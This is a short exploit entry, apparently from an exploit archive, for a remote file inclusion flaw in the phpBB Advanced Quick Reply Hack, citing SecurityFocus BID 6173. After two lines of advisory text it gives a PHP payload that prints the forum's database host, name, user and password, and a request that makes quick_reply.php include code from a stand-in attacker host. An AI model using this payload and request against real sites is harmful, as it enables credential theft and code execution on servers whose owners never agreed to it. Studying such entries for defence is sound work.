@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/6173/info
+
+The phpBB Advanced Quick Reply Hack is prone to an issue which may allow attackers to include arbitrary files from a remote server.
+
+It is possible for remote attackers to influence the include path for 'extension.inc' in the 'quick_reply.php' script. As a result, an attacker may cause an arbitrary PHP script to be included from an attacker-supplied source, which may result in execution of commands with the privileges of the webserver. 
+
+<?php
+include('config'.'.php');
+echo "DB Type: $dbms <br>";
+echo "DB Host: $dbhost <br>";
+echo "DB Name: $dbname <br>";
+echo "DB User: $dbuser <br>";
+echo "DB Pass: $dbpasswd <br>";
+exit;
+?>
+
+Then submit the following request to the host running the vulnerable software:
+
+http://www.example.com/quick_reply.php?phpbb_root_path=http://attackersite.tld/&mode=smilies 
